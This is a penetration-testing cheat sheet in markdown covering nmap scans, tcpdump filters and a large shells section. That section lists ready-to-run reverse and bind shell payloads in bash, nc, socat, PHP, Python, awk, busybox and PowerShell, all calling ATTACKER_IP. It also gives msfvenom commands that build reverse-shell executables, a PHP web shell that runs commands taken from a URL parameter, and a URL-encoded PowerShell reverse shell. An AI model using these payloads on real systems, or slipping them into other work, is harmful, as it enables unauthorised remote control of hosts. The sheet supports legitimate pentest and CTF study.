# Networking Commands

![](.gitbook/assets/networking.png)

---

## 🌐 Resources 🔗

> - [Nmap Cheat Sheet 2024: All the Commands & Flags - Stationx](https://www.stationx.net/nmap-cheat-sheet/)
> - [Reverse Shell Cheat Sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
>   - [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
> - [Reverse Shell Cheat Sheet - swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
> - [Reverse Shells - Linux | HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
> - [Online - Reverse Shell Generator](https://www.revshells.com/)
>   - [p0wny-shell](https://github.com/flozz/p0wny-shell)
>   - [R57 Shell](https://www.r57shell.net/index.php)
> - [Upgrading Simple Shells to Fully Interactive TTYs - ropnop](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
> - [TryHackMe | Intro to shells](https://tryhackme.com/r/room/introtoshells)

---

## nmap

```bash
# HOST DISCOVERY

## Ping scan
sudo nmap -sn TARGET_IP/NETWORK
## ARP scan
netdiscover -i eth1 -r TARGET_IP/NETWORK

# NMAP PORT SCAN
nmap TARGET_IP
## Skip ping
nmap -Pn TARGET_IP
## Scan all ports
nmap -p- TARGET_IP
## Port 80 only scan
nmap -p 80 TARGET_IP
## Custom list of ports scan
nmap -p 80,445,3389,8080 TARGET_IP
## Custom ports range scan
nmap -p1-2000 TARGET_IP
## Fast mode & verbose scan
nmap -F TARGET_IP -v
## UDP scan
nmap -sU TARGET_IP
## Service scan
nmap -sV TARGET_IP
## Service + O.S. detection scan
sudo nmap -sV -O TARGET_IP
## Default Scripts scan
nmap -sC TARGET_IP
nmap -Pn -F -sV -O -sC TARGET_IP
## Aggressive scan
nmap -Pn -F -A TARGET_IP
## Timing (T0=slow ... T5=insanely fast) scan
nmap -Pn -F -T5 -sV -O -sC TARGET_IP -v
## Output scan
nmap -Pn -F -oN outputfile.txt TARGET_IP 
nmap -Pn -F -oX outputfile.xml TARGET_IP 
## Output to all formats
nmap -Pn -sV -sC -O -oA outputfile TARGET_IP
nmap -Pn -sV -sC -O -oA outputfile TARGET_IP
nmap -A -oA outputfile TARGET_IP
```

---

## tcpdump

```bash
# sudo

tcpdump -i any
tcpdump -i INTERFACE
tcpdump -i INTERFACE -w file.pcap
tcpdump -i INTERFACE -c PACKETS_NUMBER
tcpdump -v
tcpdump -vvv

# No DNS lookup, no DNS+PORT_Number lookup
tcpdump -i INTERFACE -n
tcpdump -i INTERFACE -nn

# Filters
tcpdump host IP/HOSTNAME
tcpdump src host IP/HOSTNAME
tcpdump dst host IP/HOSTNAME
tcpdump src port PORT
tcpdump dst port PORT
tcpdump <protocol> -n
tcpdump icmp -n

tcpdump host 1.1.1.1 and tcp
tcpdump udp or icmp
tcpdump not tcp
tcpdump -i any tcp port 22
tcpdump -i wlo1 udp port 123
tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap

tcpdump -r -c 5 -n
tcpdump -r file.pcap dst port 53
tcpdump -r file.pcap greater 15000
tcpdump -r file.pcap -e -n arp
tcpdump -r file.pcap -q # Quick output; print brief packet information
tcpdump -r file.pcap -e # Print the link-level header (MAC)
tcpdump -r file.pcap -A # Show packet data in ASCII
tcpdump -r file.pcap -xx # Show packet data in hexadecimal format (hex)
tcpdump -r file.pcap -X # Show packet headers and data in hex and ASCII

# pcap filtering
# proto[expr:size]
# tcp[tcpflags]
man pcap-filter
# Capture TCP packets with only SYN flag set
tcpdump "tcp[tcpflags] == tcp-syn"
# Capture TCP packets with at least SYN flag set
tcpdump "tcp[tcpflags] & tcp-syn != 0"
# Capture TCP packets with at least SYN or ACK flags set
tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack) != 0"
```

---

## ip

```bash
ip a
ip -br -c a

# Get public IP address
dig +short myip.opendns.com @resolver1.opendns.com
```

---

## dns

```bash
cat /etc/resolv.conf
```

---

## shells

```bash
# Reverse Shell
# Target --> Attacker

# Attacker
nc -nvlp ATTACKER_PORT
socat TCP-L:ATTACKER_PORT -
socat TCP-L:ATTACKER_PORT FILE:`tty`,raw,echo=0 # stable full tty shell

# Target payload (nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
# Linux Target (socat)
socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:"bash -li"
# Windows Target (socat)
socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:powershell.exe,pipes
# Stable shell (socat)
socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

```bash
# Bind Shell
# Target <-- Attacker

# Target (nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
# Linux Target (socat)
socat TCP-L:PORT EXEC:"bash -li"
# Windows Target (socat)
socat TCP-L:PORT EXEC:powershell.exe,pipes

# Attacker
nc -nv TARGET_IP 8080
socat TCP:TARGET-IP:TARGET-PORT -
```

```bash
# Listeners
rlwrap nc -nvlp 443 # more featured shell
ncat -nvlp 4444
ncat --ssl -nvlp 4444
socat -d -d TCP-LISTEN:443 STDOUT
```

```bash
# Shell Payloads e.g.
# other here https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'

export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKERIP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKERIP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

TF=$(mktemp -u);mkfifo $TF && telnet ATTACKERIP 443 0<$TF | sh 1>$TF

awk 'BEGIN {s = "/inet/tcp/0/ATTACKERIP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

busybox nc ATTACKER_IP 443 -e sh

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
```

```bash
# msfvenom generate reverse shell
msfvenom -p OS/ARCH/PAYLOAD OPTIONS
msfvenom --list payloads

# Stageless payload
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKER_IP LPORT=ATTACKER_PORT

# Staged payload
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
```

### shell stabilisation

**Python**

1.  Spawn a better featured bash shell; note that some targets may need the version of Python specified

2.  Get access to term commands (e.g. `clear`)

3.  Background the shell. Turn off our own terminal echo (which gives access to tab autocompletes, the arrow keys, and Ctrl + C) and foreground the shell

4. Change terminal tty size

5. If the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter

```bash
# In reverse shell
# 1.
python -c 'import pty;pty.spawn("/bin/bash")'
# 2.
export TERM=xterm
# 3.
Ctrl + Z # to background the shell

# In Attack VM
stty raw -echo; fg
# 4.
# on another terminal, get rows and columns number
stty -a

# In reverse shell terminal
stty rows <number>
stty cols <number>

# 5. Close the reverse shell
reset
```

---

## web shells

```bash
ls -lah /usr/share/webshells
```

```bash
# PHP Web Shell

# shell.php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
    
# Execute --> http://victim.com/uploads/shell.php?cmd=whoami
```

```bash
# p0wny-shell - PHP shell
cd /opt
sudo git clone https://github.com/flozz/p0wny-shell.git
cd /opt/p0wny-shell
docker build -t p0wny .
docker run -it -p 8080:80 -d p0wny
# http://127.0.0.1:8080/shell.php
```

```powershell
# URL encoded powershell reverse shell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

---

## python webserver

```bash
sudo python3 -m http.server 8000
```

---







